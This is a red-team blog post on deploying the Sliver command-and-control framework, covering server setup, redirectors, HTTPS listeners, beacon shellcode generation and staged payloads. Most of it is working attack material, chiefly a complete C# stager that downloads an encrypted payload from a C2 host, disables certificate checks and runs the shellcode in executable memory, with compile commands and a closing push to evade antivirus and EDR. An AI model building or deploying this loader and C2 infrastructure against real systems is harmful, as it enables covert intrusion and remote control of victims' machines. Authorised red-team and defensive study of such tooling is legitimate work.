---
title: "Sliver C2 Deployment for Red Team Engagements"
date: 2023-07-25
categories: redteam
published: true
---

[Sliver](https://github.com/BishopFox/sliver/) has been a popular open-source C2 in recent years and has had continuous improvements since its release. It's cross-platform and easy to setup which were both appealing to me when I first started using it. I wanted to learn how to setup Sliver as a C2 server for red teams so I decided to document it for my own reference and anyone else interested. Here's what we'll cover:

- Sliver installation
- Connecting and Setup
- Redirectors
- Beacons
- Staged Payloads

---------------------------------------------

## Sliver Installation

Sliver documentation: [https://github.com/BishopFox/sliver/wiki](https://github.com/BishopFox/sliver/wiki)

Spin up a Linux droplet/EC2/whatever to host your C2 server. Run the initial updates and install MinGW to allow compilation of shellcode/staged/DLL payloads:
```bash
apt update -y
apt update --fix-missing -y
apt install git mingw-w64 net-tools -y
```

Once the system is updated, Sliver is __very__ easy to install using the setup script ([reference](https://github.com/BishopFox/sliver/#getting-started)): <br />
`curl https://sliver.sh/install|sudo bash` <br />
This will automatically start Sliver running in [Daemon mode](https://github.com/BishopFox/sliver/wiki/Daemon-Mode). 

You can then create a client config on your Sliver server to allow "multiplayer" connections: <br />
`/root/sliver-server operator --name sliver-user --lhost "<SLIVER-IP>" --save /root/sliver-user.cfg`<br />
Download the output "**sliver-user.cfg**" file to your local host using SCP or whatever file transfer app you like which you will use to connect to the server using a Sliver client.

__IMPORTANT STEP:__ *Don't forget to lock down your C2 server firewalls so that only you can access it. You can do this through firewalls in your cloud console, UFW rules, IPTables, etc. You will also need to open it up to your redirector (in our case over HTTPS) but more on this later.*

I created some Terraform scripts to help automate this whole process in DigitalOcean found on my [GitHub repository here](https://github.com/wsummerhill/Automation-Scripts/tree/main/Sliver-C2-deployment_DigitalOcean).

## Connecting and Setup

On your test system, download the Sliver client for your specific OS from the [Sliver releases](https://github.com/BishopFox/sliver/releases). Import your **sliver-user.cfg** config file from the previous steps and connect to the Sliver server with the following commands:<br />
```bash
./sliver-client_OS import ./sliver-user.cfg  # Import client
./sliver-client_OS  # Connect to Sliver C2
Connecting to <SLIVER-IP>:31337 ...

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain assist
[*] Server v1.5.40 - c17c37857e54f0fa202c01cbd00a99a85f5f9f49
[*] Welcome to the sliver shell, please type 'help' for options

sliver >
```

For our red team setup, we're going to use an HTTPS redirector pointing to your C2 server. We also need to make sure that the Sliver server is locked down using firewall rules by making it accessible ONLY to your own IP addresses and the soruce IPs of your redirector(s) open over port 443 to be the most opsec-safe. BE SURE that your Sliver server is NOT directly accessible over the Internet to anyone.<br />
If you want to do this with UFW rules, it would look something like this:<br />
```bash
# Allow your IPs
ufw allow from <YOUR-IP>
ufw allow from <YOUR-IP-2>
# Allow your redirectors over HTTPS
ufw allow from <REDIRECTOR-IP> to any port 443
ufw allow from <REDIRECTOR-IP> to any port 443
ufw allow from <REDIRECTOR-IP> to any port 443
# Start firewall
ufw enable # Select Y at prompt
```

## Redirectors 

We're not actually going to cover HTTPS redirector setup as there are many different blogs and techniques to do this (i.e. [how-to-guides](https://howto.thec2matrix.com/attack-infrastructure/redirectors), [AWS lambda redirectors](https://blog.xpnsec.com/aws-lambda-redirector/), [bluescreenofjeff](https://bluescreenofjeff.com/2018-04-12-https-payload-and-c2-redirectors/), etc.). So for the rest of this post we'll assume you already have an HTTPS redirector setup!

Now we'll have to start an HTTPS listener in Sliver which only accepts connections from our redirector host. But first we'll need to setup an SSL certificate with a public/private key (without encryption as Sliver doesn't accept encrypted private keys) to have a valid SSL/TLS connection. You could use a self-signed one (using the `--self-signed` option), but for red teams we would much rather have a valid/signed cert for our HTTPS connections to be less suspicious.

To create your SSL/TLS certificate for HTTPS communications with your listener, you can use whatever service/app you prefer. LetsEncrypt is probably the most common method, and recently I started using AWS Certificate Manager (ACM) certs.<br />

To automate this with LetsEncrypt, I modified one of RedSiege's script for setting up a cert Cobalt Strike and made it compatible with Sliver ([Link HERE](https://github.com/wsummerhill/Automation-Scripts/blob/main/HttpsGenericC2DoneRight.sh)).<br />

Drop the `HttpsGenericC2DoneRight.sh` script on your Sliver teamserver and run it with Sudo privileges. Enter in your C2 domain (with an A record pointing to your C2 server) and any private key password:
![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/fd02dfbc-dc55-4ad4-83d9-1bea28e1a12e)

If everything works properly, the script should output you a domain store file, cert.pem and privkey.pem files in your `/root` directory. Copy these files to your local system with your Sliver client installed.
![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/a57e5b26-eee7-4556-aa19-5fa3b8307204)

## Listeners

### HTTP Listener

Simply start an HTTP listener accepting connections from any domaon:<br />
`http --persistent`

Start an HTTP listener accepting connections from your redirector domain:<br />
`http -d domain-pointing-to-sliver.com --persistent`

### HTTPS Listener
Using an above HTTPS redector, we can easily start an HTTPS listener which only accepts connections from your redirector domain:<br />
`https -d domaing-pointing-to-sliver.com --lhost <SLIVER-PRIVATE-IP> --lets-encrypt -p`

It's recommended to create an SSL/TLS certificate using the above `HttpsGenericC2DoneRight.sh` script (or similar technique) and copy it to your folder containing the Sliver client. Start your HTTPS listener pointing to your HTTPS cert:<br />
`https -d domaing-pointing-to-sliver.com --lhost <SLIVER-PRIVATE-IP> -c cert.pem -k privkey.pem -p`

Note that the private key CANNOT be encrypted, otherwise it will fail. 

## Beacons

Sliver C2 implants communicate in 2 different ways: **Beacons** or **Sessions**. For red teams and better opsec we will always be using Beacons which use asynchronous communications that periodically check-in at a certain time interval. The alternative would be Sessions which use an established interactive mode connection (noisy and poor opsec). <br />
Beacons function the same way Cobalt Strike communication channels work using asynchronous connections. The one downside of Sliver is that it doesn't have a sleep mask like Cobalt Strike does, meaning the Beacon code won't be obfuscated/encrypted in-memory while sleeping between connections. 

To create new Beacon shellcode for Windows using your HTTPS redirector (you previously set this up right?), use the following command:<br />
`generate beacon --http https:/sliver-redirector.com --save /output/path/sliver-shellcode64.bin --seconds 60 --os windows --format shellcode --evasion`

You can then encode/encrypt/obfuscate your output shellcode however you like and create a custom payload using it!

If you are up against a Linux environment and want to create an out-of-the-box Linux binary payload (ELF file format), use this command:<br />
`generate beacon --http https:/sliver-redirector.com --save /output/folder/ --seconds 60 --os linux --evasion`

## Staged Payloads

Useful links:
- [https://github.com/BishopFox/sliver/wiki/Stagers](https://github.com/BishopFox/sliver/wiki/Stagers)
- [https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/](https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/)

To create staged payloads, we'll need to create two things: a **profile** and a **staged listener**. The profile will act as a configuration for our stage 2 payoad, and the staged listener will be a stage 1 listener/payload

First, to create a **profile**, use the following command which is similar to how we previously createed Windows shellcode. This will create the profile 'https-win':<br />
`profiles new beacon --http https://sliver-redirector.com --os windows --format shellcode --evasion https-win`<br />

Type `profiles` and you should see your 'https-win' profile created.
![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/20dd9587-79df-40c7-bb91-dd7c7bd8aee2)

Next, we need to create a staged listener that links to our profile. In this case, I obfuscated the staged payload using gzip compression and AES encryption: <br />
`stage-listener --url http://sliver-domain:80 --profile https-win --compress gzip --aes-encrypt-key "LgUmeMnmUpRrCBRB" --aes-encrypt-iv "nStxRW5o6TNHcKBx"`
![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/ae2aa7e6-9e9d-4812-8d53-681651c30608)

**Note:** *If you're using your Sliver C2 server to host the stage 1 payload, you need to set it up on a different protocol/port as your HTTPS listener (which is why i used HTTP port 80). Alternatively, you can set it up, download the shellcode then host it anywhere else for better opsec (i.e. a cloud provider). If you host it elsewhere, don't forget to kill your original staged listener so you don't leave it exposed!*

Once you create the staged listener, your stage 2 payload should be available at [http://sliver-domain:80/AnythingHere.woff](http://sliver-domain:80/AnythingHere.woff). Note the ".woff" extension to download your shellcode. This is due to the "*stager_file_extension*" setting in your Sliver config ([reference](https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2#implant_config)). You could change this to any other extension you like in the configuration.<br />

Now we need to create a stage 1 payload to reach out to download and decrypt/decode our stage 2 payload and then execute it. This should be as custom as possible for a red team, but a good starting point is the provided C# template [here in the Sliver documentation](https://github.com/BishopFox/sliver/wiki/Stagers#encrypted-stage-example) (note for this payload you'll have to add gzip compression if you chose that option in your `stage-listener` command).

For the standard template, update the C# payloads variables to fit your url, AES key, and AES IV at the top of the script. See a full sample payload here that's slightly customized:
```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Custom_Stager
{
    class Program
    {
        private static string url = "http://sliver-domain.com:80/text-fonts.woff";
        private static string AESKey = "LgUmeMnmUpRrCBRB";
        private static string AESIV = "nStxRW5o6TNHcKBx";

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        // Decrypt
        private static byte[] AESDecrypt(byte[] ciphertext, string AESKey, string AESIV) {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }

        // Gzip 
        public static byte[] Decompress(byte[] input)
        {
            using (MemoryStream tmpMs = new MemoryStream())
            {
                using (MemoryStream ms = new MemoryStream(input))
                {
                    GZipStream zip = new GZipStream(ms, CompressionMode.Decompress, true);
                    zip.CopyTo(tmpMs);
                    zip.Close();
                }
                return tmpMs.ToArray();
            }
        }

        public static byte[] Download(string url) {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            return shellcode;
        }

        public static void Execute(byte[] code) {
            List<byte> list = new List<byte> { };   

            for (int i = 16; i <= code.Length -1; i++) {
                list.Add(code[i]);
            }

            byte[] encrypted = list.ToArray();
            
            byte[] decrypted;
            decrypted = AESDecrypt(encrypted, AESKey, AESIV);   // First, AES decrypt

            byte[] decompressed = Decompress(decrypted);        // Second, GZip decompress
            
            // Execute stuff
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)decompressed.Length, 0x3000, 0x40);
            Marshal.Copy(decompressed, 0, addr, decompressed.Length);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            return;
        }

        // Main Entry
        public static void Main(String[] args) 
        {
            // Get stagd payload
            byte[] output = Download(url);

            Execute(output);

            return;
        }
    }
}
```
Compile the C# payload with csc.exe into an EXE for testing purposes: `C:\windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /platform:x64 /out:Sliver-payload.exe Sliver_staged-payload.cs`

Run the output payload `./Sliver-payload.exe` and you should see a new beacon pop up in Sliver!
![image](https://github.com/wsummerhill/wsummerhill.github.io/assets/35749735/ced5d4ca-1f86-459b-92aa-c81bce707990)

Of course for a red team, we want to further customize the stage 1 payload to make it as unique and evasive as possible. It's also recommended to use a DLL instead of an EXE as it will be better for evasion. We aren't going to cover that here as this is just a proof-of-concept, but get as creative as possible to byass that AV/EDR!
<br /><br />
Hope you all enjoyed the Sliver setup!
